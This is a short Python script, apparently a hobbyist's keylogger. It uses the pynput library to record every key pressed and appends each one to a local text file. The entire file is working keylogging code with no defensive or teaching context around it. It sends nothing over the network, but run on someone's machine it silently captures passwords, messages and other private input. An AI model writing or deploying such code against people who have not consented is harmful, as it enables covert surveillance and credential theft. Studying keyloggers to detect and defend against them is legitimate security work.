from pynput.keyboard import Listener    

def hamid_keylogger(key):
    with open("keylogger_generated_by_hamid.txt", "a") as f:
        f.write(str(key) + "\n")

with Listener(on_press=hamid_keylogger) as listener:
    listener.join()